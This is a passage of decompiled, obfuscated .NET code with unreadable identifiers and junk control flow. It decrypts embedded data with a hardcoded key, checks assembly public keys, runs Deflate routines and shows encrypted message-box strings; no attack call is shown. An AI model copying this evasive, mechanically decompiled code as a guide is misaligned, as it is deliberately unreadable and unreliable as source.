          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray6 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0005.\u0003 obj4 = new \u0005.\u0003())
        {
          if (true)
          {
            using (ICryptoTransform cryptoTransform = \u0004.\u0001(numArray5, obj4, numArray6, true))
              numArray1 = \u0004.\u0001(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
          }
        }
      }
label_46:
      obj1.Close();
      return numArray1;
label_47:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0004.\u0001(callingAssembly, executingAssembly))
        return (byte[]) null;
      obj1 = new \u0004.\u000F(_param0);
      numArray1 = new byte[0];
      *(int*) voidPtr = \u0004.\u0001(obj1);
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) \u0004.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0001(obj1);
      }
      else
        goto label_15;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = \u0004.\u0001(obj1);
      if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
        throw new FormatException("Wrong Header Signature");
      \u0004.\u0001(obj1);
      \u0004.\u0001(obj1);
      \u0004.\u0001(obj1);
      goto label_7;
label_15:
      *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
      if (*(int*) voidPtr != 8223355)
        throw new FormatException("Unknown Header");
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = \u0004.\u0001(obj1);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
          {
            *(int*) ((IntPtr) voidPtr + 36) = \u0004.\u0001(obj1);
            *(int*) ((IntPtr) voidPtr + 40) = \u0004.\u0001(obj1);
            byte[] numArray7 = new byte[*(int*) ((IntPtr) voidPtr + 36)];
            obj1.Read(numArray7, 0, numArray7.Length);
            \u0004.\u0001 obj5 = new \u0004.\u0001(numArray7);
            \u0004.\u0001(*(int*) ((IntPtr) voidPtr + 40), obj5, *(int*) ((IntPtr) voidPtr + 32), numArray1);
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
          }
        }
        if (*(int*) ((IntPtr) voidPtr + 24) == 2)
        {
          numArray4 = new byte[8]
          {
            (byte) 145,
            (byte) 16,
            (byte) 67,
            (byte) 67,
            (byte) 142,
            (byte) 215,
            (byte) 75,
            (byte) 49
          };
          goto label_23;
        }
        else
          goto label_34;
      }
      else
        goto label_4;
    }

    static unsafe bool \u0001(int _param0, [In] \u0004.\u0008 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(22);
      int num1 = 128;
      *(int*) voidPtr = 128;
      short[] numArray = obj1.\u0002;
      int index = obj1.\u0014;
      *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0014 + obj1.\u0012;
      *(int*) ((IntPtr) voidPtr + 8) = Math.Max(obj1.\u0012, 2);
      *(int*) ((IntPtr) voidPtr + 12) = Math.Max(obj1.\u0014 - 32506, 0);
      *(int*) ((IntPtr) voidPtr + 16) = obj1.\u0014 + 258 - 1;
      *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
      *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
      if (*(int*) ((IntPtr) voidPtr + 8) >= 8)
        num1 >>= 2;
      if (*(int*) voidPtr > obj1.\u0015)
        *(int*) voidPtr = obj1.\u0015;
      int num2;
      int num3;
      do
      {
        if ((int) obj1.\u0001[_param0 + *(int*) ((IntPtr) voidPtr + 8)] == (int) *(byte*) ((IntPtr) voidPtr + 21) && (int) obj1.\u0001[_param0 + *(int*) ((IntPtr) voidPtr + 8) - 1] == (int) *(byte*) ((IntPtr) voidPtr + 20) && (int) obj1.\u0001[_param0] == (int) obj1.\u0001[index] && (int) obj1.\u0001[_param0 + 1] == (int) obj1.\u0001[index + 1])
        {
          int num4 = _param0 + 2;
          int num5 = index + 2;
          int num6;
          int num7;
          int num8;
          int num9;
          int num10;
          int num11;
          int num12;
          do
            ;
          while ((int) obj1.\u0001[++num5] == (int) obj1.\u0001[num6 = num4 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num7 = num6 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num8 = num7 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num9 = num8 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num10 = num9 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num11 = num10 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num12 = num11 + 1] && (int) obj1.\u0001[++num5] == (int) obj1.\u0001[num4 = num12 + 1] && num5 < *(int*) ((IntPtr) voidPtr + 16));
          if (num5 > *(int*) ((IntPtr) voidPtr + 4))
          {
            obj1.\u0011 = _param0;
            *(int*) ((IntPtr) voidPtr + 4) = num5;
            *(int*) ((IntPtr) voidPtr + 8) = num5 - obj1.\u0014;
            if (*(int*) ((IntPtr) voidPtr + 8) < *(int*) voidPtr)
            {
              *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
              *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
            }
            else
              break;
          }
          index = obj1.\u0014;
        }
        if ((_param0 = (int) numArray[_param0 & (int) short.MaxValue] & (int) ushort.MaxValue) > *(int*) ((IntPtr) voidPtr + 12))
        {
          num2 = num1;
          num3 = 1;
          if (num3 == 0)
            goto label_1;
        }
        else
          break;
      }
      while ((num1 = num2 - num3) != 0);
      obj1.\u0012 = Math.Min(*(int*) ((IntPtr) voidPtr + 8), obj1.\u0015);
      int num13 = obj1.\u0012;
      int num14 = 3;
label_16:
      return num13 >= num14;
label_1:
      num14 = num3;
      num13 = num2;
      goto label_16;
    }

    static int \u0001([In] \u0004.\u0003 obj0) => obj0.\u0004;

    static bool \u0001(Assembly _param0, Assembly _param1)
    {
label_0:
      byte[] publicKey1 = _param1.GetName().GetPublicKey();
      byte[] publicKey2 = _param0.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    static unsafe void \u0001([In] \u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(29);
label_4:
      *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 0;
      if (*(sbyte*) ((IntPtr) voidPtr + 28) == (sbyte) 0)
        return;
      *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 1;
      if (*(sbyte*) ((IntPtr) voidPtr + 28) != (sbyte) 0)
        goto label_6;
label_2:
      *(int*) ((IntPtr) voidPtr + 16) = 4140327;
      do
      {
        *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 1;
      }
      while (*(sbyte*) ((IntPtr) voidPtr + 28) != (sbyte) 0);
      goto label_4;
label_6:
      *(long*) voidPtr = 301948011L;
      *(long*) ((IntPtr) voidPtr + 8) = 7747L;
      *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 0;
      if (*(sbyte*) ((IntPtr) voidPtr + 28) != (sbyte) 0)
      {
        *(int*) ((IntPtr) voidPtr + 20) = 814;
        goto label_2;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 24) = 7090;
        goto label_2;
      }
    }

    static unsafe int \u0001(\u0004.\u0003 _param0, \u0004.\u0002 _param1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int val1 = obj2;
      int val2 = 32768;
      if (val2 != 0)
        val2 -= _param0.\u0004;
      obj2 = Math.Min(Math.Min(val1, val2), _param1.AvailableBytes);
      *(int*) ((IntPtr) voidPtr + 4) = 32768 - _param0.\u0003;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u0004.\u0001(_param1, _param0.\u0001, _param0.\u0003, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u0004.\u0001(_param1, _param0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u0004.\u0001(_param1, _param0.\u0001, _param0.\u0003, obj2);
      _param0.\u0003 = _param0.\u0003 + *(int*) voidPtr & (int) short.MaxValue;
      _param0.\u0004 += *(int*) voidPtr;
      return *(int*) voidPtr;
    }

    static unsafe bool \u0001(int _param0, \u0004.\u0007 _param1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      _param1.\u0001[_param1.\u000E] = (short) _param0;
      byte[] numArray1 = _param1.\u0002;
      \u0004.\u0007 obj = _param1;
      int num1;
      int num2 = num1 = obj.\u000E;
      obj.\u000E = num1 + 1;
      int index1 = num2;
      int num3 = (int) (byte) (obj2 - 3);
      numArray1[index1] = (byte) num3;
      *(int*) voidPtr = \u0004.\u0001(_param1, obj2 - 3);
      short[] numArray2;
      IntPtr index2;
      (numArray2 = _param1.\u0001.\u0001)[(int) (index2 = (IntPtr) *(int*) voidPtr)] = (short) ((int) numArray2[index2] + 1);
      int num4;
      if (*(int*) voidPtr >= 265)
      {
        int num5 = *(int*) voidPtr;
        if (true)
        {
          if (num5 >= 285)
            goto label_4;
        }
        else
        {
          num4 = num5;
          goto label_8;
        }
      }
      else
        goto label_4;
label_3:
      _param1.\u000F += (*(int*) voidPtr - 261) / 4;
label_4:
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0001(_param1, _param0 - 1);
        short[] numArray3;
        IntPtr index3;
        (numArray3 = _param1.\u0002.\u0001)[(int) (index3 = (IntPtr) *(int*) ((IntPtr) voidPtr + 4))] = (short) ((int) numArray3[index3] + 1);
        if (*(int*) ((IntPtr) voidPtr + 4) >= 4)
          _param1.\u000F += *(int*) ((IntPtr) voidPtr + 4) / 2 - 1;
        num4 = _param1.\u000E;
      }
      else
        goto label_3;
label_8:
      return num4 >= 16384;
    }

    static unsafe bool \u0001([In] \u0004.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      switch (obj0.\u0013)
      {
        case 2:
          if (obj0.\u0001)
          {
            obj0.\u0013 = 12;
            return false;
          }
          *(int*) voidPtr = \u0004.\u0001(obj0.\u0001, 3);
          if (*(int*) voidPtr < 0)
            return false;
          break;
        case 3:
          if ((obj0.\u0017 = \u0004.\u0001(obj0.\u0001, 16)) >= 0)
          {
            \u0004.\u0001(obj0.\u0001, 16);
            goto label_18;
          }
          else
            goto label_15;
        case 4:
label_19:
          *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0001(obj0.\u0001, 16);
          int num1 = *(int*) ((IntPtr) voidPtr + 4);
          if (false)
            return num1 != 0;
          if (num1 < 0)
          {
            if (true)
              return false;
            goto case 3;
          }
          else
            goto label_23;
        case 5:
label_24:
          *(int*) ((IntPtr) voidPtr + 8) = \u0004.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0017);
          obj0.\u0017 -= *(int*) ((IntPtr) voidPtr + 8);
          if (obj0.\u0017 != 0)
            return !obj0.\u0001.IsNeedingInput;
          obj0.\u0013 = 2;
          if (true)
            return true;
          break;
        case 6:
          if (!\u0004.\u0001(obj0.\u0001, obj0.\u0001))
            return false;
          obj0.\u0001 = \u0004.\u0001(obj0.\u0001);
          obj0.\u0002 = \u0004.\u0001(obj0.\u0001);
          obj0.\u0013 = 7;
          goto case 7;
        case 7:
        case 8:
        case 9:
        case 10:
          return \u0004.\u0001(obj0);
        case 12:
          return false;
        default:
          return false;
      }
      \u0004.\u0001(obj0.\u0001, 3);
      if ((*(int*) voidPtr & 1) != 0)
        obj0.\u0001 = true;
      int num2 = *(int*) voidPtr;
label_6:
      switch (num2 >> 1)
      {
        case 0:
          \u0004.\u0001(obj0.\u0001);
          obj0.\u0013 = 3;
          break;
        case 1:
          obj0.\u0001 = \u0004.\u0004.\u0001;
          obj0.\u0002 = \u0004.\u0004.\u0002;
          obj0.\u0013 = 7;
          if (true)
          {
            if (true)
            {
              if (false)
                goto label_23;
              else
                break;
            }
            else
              goto label_15;
          }
          else
            goto label_18;
        case 2:
          obj0.\u0001 = new \u0004.\u0005();
          obj0.\u0013 = 6;
          break;
      }
      return true;
label_15:
      int num3 = 0;
      if (num3 == 0)
        return num3 != 0;
      num2 = num3;
      goto label_6;
label_18:
      obj0.\u0013 = 4;
      goto label_19;
label_23:
      \u0004.\u0001(obj0.\u0001, 16);
      obj0.\u0013 = 5;
      goto label_24;
    }

    static int \u0001([In] \u0004.\u000F obj0) => \u0004.\u0001(obj0) | \u0004.\u0001(obj0) << 16;

    static unsafe void \u0001([In] \u0003.\u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(191);
      int num1 = (int) MessageBox.Show(\u0004.\u000F(7730));
      *(double*) voidPtr1 = 223262.0;
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 0;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
        {
          *(double*) ((IntPtr) voidPtr1 + 8) = 87597.0;
          try
          {
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            void* voidPtr2;
            *(double*) ((IntPtr) voidPtr2 + 16) = 47801417.0;
            *(long*) ((IntPtr) voidPtr2 + 32) = 19L;
            *(int*) ((IntPtr) voidPtr2 + 120) = 6840623;
            while (true)
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 189) = (sbyte) 0;
              if (true)
              {
                if (*(sbyte*) ((IntPtr) voidPtr2 + 189) == (sbyte) 0)
                  goto label_6;
label_3:
                continue;
label_6:
                *(sbyte*) ((IntPtr) voidPtr2 + 189) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 189) != (sbyte) 0)
                {
                  while (true)
                  {
                    *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
                    if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                    {
                      *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
                      if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                        *(int*) ((IntPtr) voidPtr2 + 124) = 0;
                    }
                    else
                      break;
                  }
                  *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
                  if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                  {
                    int num2 = (int) MessageBox.Show(\u0004.\u000F(7988));
                    *(int*) ((IntPtr) voidPtr2 + 128) = 4635840;
                    while (true)
                    {
                      int num3 = *(int*) ((IntPtr) voidPtr2 + 128);
                      *(int*) ((IntPtr) voidPtr2 + 180) = 1;
                      int num4 = *(int*) ((IntPtr) voidPtr2 + 180);
                      if (num3 <= num4)
                      {
                        *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
                        int num5 = (int) *(sbyte*) ((IntPtr) voidPtr2 + 190);
                        while (true)
                        {
                          if (num5 == 0)
                            ;
                          *(sbyte*) ((IntPtr) voidPtr2 + 185) = (sbyte) 1;
                          int num6;
                          while (true)
                          {
                            *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
                            if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                            {
                              while (true)
                              {
                                *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
                                if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                                {
                                  *(int*) ((IntPtr) voidPtr2 + 132) = 46801;
                                  *(long*) ((IntPtr) voidPtr2 + 48) = 74635L;
                                  *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
                                  if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                                    *(double*) voidPtr2 = 903098822.0;
                                }
                                else
                                  break;
                              }
                              *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
                              if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                              {
                                *(int*) ((IntPtr) voidPtr2 + 140) = 635;
                                while (true)
                                {
                                  *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
                                  if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                                  {
                                    *(long*) ((IntPtr) voidPtr2 + 64) = 4L;
                                    *(double*) ((IntPtr) voidPtr2 + 56) = 4.0;
                                    *(sbyte*) ((IntPtr) voidPtr2 + 186) = (sbyte) 1;
                                    string str = \u0004.\u000F(8101);
                                    *(long*) ((IntPtr) voidPtr2 + 72) = 28L;
                                  }
                                  else
                                    break;
                                }
                                *(double*) voidPtr2 = 98537391.0;
                                *(int*) ((IntPtr) voidPtr2 + 136) = 8;
                                *(int*) ((IntPtr) voidPtr2 + 144) = 69610;
                                int num7;
                                do
                                {
                                  *(sbyte*) ((IntPtr) voidPtr2 + 187) = (sbyte) 1;
                                  *(long*) ((IntPtr) voidPtr2 + 80) = 7344882L;
                                  *(double*) ((IntPtr) voidPtr2 + 88) = 277168393.0;
                                  *(int*) ((IntPtr) voidPtr2 + 144) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 144) + 1);
                                  num6 = *(int*) ((IntPtr) voidPtr2 + 144);
                                  *(int*) ((IntPtr) voidPtr2 + 180) = 4175992;
                                  if (true)
                                    num7 = *(int*) ((IntPtr) voidPtr2 + 180);
                                  else
                                    goto label_72;
                                }
                                while (num6 <= num7);
                                *(double*) voidPtr2 = 356586277.0;
                              }
                            }
                            else
                              goto label_30;
                          }
label_72:
                          num5 = num6;
                        }
label_30:
                        string str1 = \u0004.\u000F(8178);
                        *(sbyte*) ((IntPtr) voidPtr2 + 184) = (sbyte) 1;
                        *(int*) ((IntPtr) voidPtr2 + 128) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 128) + 1);
                      }
                      else
                        break;
                    }
                    *(double*) voidPtr2 = 43.0;
                    *(double*) ((IntPtr) voidPtr2 + 40) = 9450.0;
                  }
                }
                if (false)
                  goto label_3;
                else
                  break;
              }
              else
                goto label_40;
            }
            *(long*) ((IntPtr) voidPtr2 + 24) = 12155L;
            *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
              *(int*) ((IntPtr) voidPtr2 + 148) = 10443228;
            else
              *(int*) ((IntPtr) voidPtr2 + 152) = 19;
            *(double*) voidPtr2 = 77685.0;
            *(int*) ((IntPtr) voidPtr2 + 156) = 4328;
label_39:
            *(sbyte*) ((IntPtr) voidPtr2 + 188) = (sbyte) 1;
label_40:
            int num8 = (int) MessageBox.Show(\u0004.\u000F(8291));
            *(long*) ((IntPtr) voidPtr2 + 96) = 0L;
            try
            {
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              if (true)
                goto label_53;
label_49:
              *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
              {
                *(int*) ((IntPtr) voidPtr2 + 160) = 557501018;
                goto label_52;
              }
label_51:
              *(int*) ((IntPtr) voidPtr2 + 164) = 909204125;
label_52:
label_53:
              *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
              {
                *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                {
                  string str2 = \u0004.\u000F(8408);
                  *(long*) ((IntPtr) voidPtr2 + 104) = 2815034L;
                  if (true)
                  {
                    string str3 = \u0004.\u000F(8501);
                    try
                    {
                    }
                    catch (Exception ex3)
                    {
                      ProjectData.SetProjectError(ex3);
                      *(long*) ((IntPtr) voidPtr2 + 112) = 138732L;
                      ProjectData.ClearProjectError();
                    }
                    goto label_49;
                  }
                }
                else
                  goto label_52;
              }
              *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
              if (true)
              {
                if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
                {
                  int num9 = (int) Interaction.MsgBox((object) \u0004.\u000F(8590));
                }
                else
                {
                  if (false)
                    ;
                  *(int*) ((IntPtr) voidPtr2 + 168) = 692995;
                }
                ProjectData.ClearProjectError();
              }
              else
                goto label_51;
            }
            *(sbyte*) ((IntPtr) voidPtr2 + 190) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 190) != (sbyte) 0)
            {
              int num10 = (int) Interaction.MsgBox((object) \u0004.\u000F(8603));
            }
            else
              *(int*) ((IntPtr) voidPtr2 + 172) = 7;
            *(int*) ((IntPtr) voidPtr2 + 156) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 156) + 1);
            int num11 = *(int*) ((IntPtr) voidPtr2 + 156);
            *(int*) ((IntPtr) voidPtr2 + 180) = 9592709;
            int num12 = *(int*) ((IntPtr) voidPtr2 + 180);
            if (num11 > num12)
              ProjectData.ClearProjectError();
            else
              goto label_39;
          }
          *(sbyte*) ((IntPtr) voidPtr1 + 190) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr1 + 190) != (sbyte) 0)
          {
            int num13 = (int) Interaction.MsgBox((object) \u0004.\u000F(8616));
          }
          else
            *(int*) ((IntPtr) voidPtr1 + 176) = 2237;
        }
        else
          break;
      }
      int num14 = (int) Interaction.MsgBox((object) \u0004.\u000F(8641));
    }

    static unsafe int \u0001(byte[] _param0, int _param1, int _param2, [In] \u0004.\u0003 obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1;
      int num2;
      do
      {
        *(int*) voidPtr = obj3.\u0003;
        num1 = _param2;
        num2 = obj3.\u0004;
        if (true)
        {
          if (true)
          {
            if (num1 <= num2)
              goto label_17;
            else
              goto label_16;
label_4:
            *(int*) ((IntPtr) voidPtr + 4) = _param2;
            continue;
label_16:
            _param2 = obj3.\u0004;
            goto label_4;
label_17:
            *(int*) voidPtr = obj3.\u0003 - obj3.\u0004 + _param2 & (int) short.MaxValue;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_12;
      }
      while (false);
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = _param2 - *(int*) voidPtr;
        int num3 = *(int*) ((IntPtr) voidPtr + 8);
        int num4 = 0;
        if (num4 == 0)
        {
          if (num3 > num4)
            Array.Copy((Array) obj3.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) _param0, _param1, *(int*) ((IntPtr) voidPtr + 8));
          else
            goto label_11;
        }
        else
        {
          num2 = num4;
          num1 = num3;
          goto label_10;
        }
      }
      int num5 = _param1;
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      num1 = num5;
label_10:
      _param1 = num1 + num2;
      _param2 = *(int*) voidPtr;
label_11:
      Array.Copy((Array) obj3.\u0001, *(int*) voidPtr - _param2, (Array) _param0, _param1, _param2);
      obj3.\u0004 -= *(int*) ((IntPtr) voidPtr + 4);
      int num6 = obj3.\u0004;
      num2 = 0;
      num1 = num6;
label_12:
      if (num1 < num2)
        throw new InvalidOperationException();
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static unsafe int \u0001(\u0004.\u0006 _param0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(22);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
      *(int*) voidPtr = 0;
      *(int*) ((IntPtr) voidPtr + 4) = obj1.Length;
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 4);
label_19:
      while (true)
      {
        do
        {
          *(int*) ((IntPtr) voidPtr + 12) = \u0004.\u0001(_param0.\u0001, obj1, *(int*) voidPtr, *(int*) ((IntPtr) voidPtr + 4));
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 12);
          _param0.\u0001 += (long) *(int*) ((IntPtr) voidPtr + 12);
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - *(int*) ((IntPtr) voidPtr + 12);
          if (*(int*) ((IntPtr) voidPtr + 4) != 0 && _param0.\u0007 != 30)
          {
            do
            {
              \u0004.\u0008 obj = _param0.\u0001;
              *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) ((_param0.\u0007 & 4) != 0);
              *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) ((_param0.\u0007 & 8) != 0);
              if (!\u0004.\u0001((bool) *(sbyte*) ((IntPtr) voidPtr + 21), (bool) *(sbyte*) ((IntPtr) voidPtr + 20), obj))
              {
                if (_param0.\u0007 != 16)
                  goto label_6;
              }
              else
                goto label_19;
            }
            while (false);
            goto label_4;
label_6:
            if (_param0.\u0007 == 20)
              goto label_7;
          }
          else
            goto label_15;
        }
        while (_param0.\u0007 != 28);
        goto label_14;
label_7:
        *(int*) ((IntPtr) voidPtr + 16) = 8 + (-_param0.\u0001.\u0003 & 7);
        do
        {
          while (*(int*) ((IntPtr) voidPtr + 16) > 0)
          {
            if (true)
            {
              \u0004.\u0001(_param0.\u0001, 2, 10);
              *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 10;
            }
          }
        }
        while (false);
        _param0.\u0007 = 16;
        continue;
label_14:
        \u0004.\u0001(_param0.\u0001);
        _param0.\u0007 = 30;
      }
label_4:
      int num2 = *(int*) ((IntPtr) voidPtr + 8);
label_5:
      int num3 = *(int*) ((IntPtr) voidPtr + 4);
      return num2 - num3;
label_15:
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      if (true)
      {
        int num4 = *(int*) ((IntPtr) voidPtr + 4);
        return num2 - num4;
      }
      goto label_5;
    }

    static void \u0001([In] \u0004.\u0003 obj0) => obj0.\u0004 = obj0.\u0003 = 0;

    static void \u0001([In] \u0001.\u0006 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static int \u0001([In] \u0004.\u0008 obj0)
    {
      int index;
      short num1;
      int num2;
      int maxValue;
      do
      {
        num2 = obj0.\u0010 << 5;
        maxValue = (int) obj0.\u0001[obj0.\u0014 + 2];
        if (true)
        {
          index = (num2 ^ maxValue) & (int) short.MaxValue;
          obj0.\u0002[obj0.\u0014 & (int) short.MaxValue] = num1 = obj0.\u0001[index];
        }
        else
          goto label_3;
      }
      while (false);
      obj0.\u0001[index] = (short) obj0.\u0014;
      obj0.\u0010 = index;
      int num3 = (int) num1;
      maxValue = (int) ushort.MaxValue;
      num2 = num3;
label_3:
      return num2 & maxValue;
    }

    static unsafe void \u0001([In] \u0004.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      *(int*) voidPtr = obj0.\u0001.Length;
      int[] numArray1 = new int[*(int*) voidPtr];
      int num1 = 0;
      int num2 = 0;
      int[] numArray2;
      while (true)
      {
        int num3 = num2;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        int num4;
        while (true)
        {
          if (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
            goto label_49;
          else
            goto label_14;
label_3:
          int num5;
          num1 = num5 + 1;
          int index1;
          int index2;
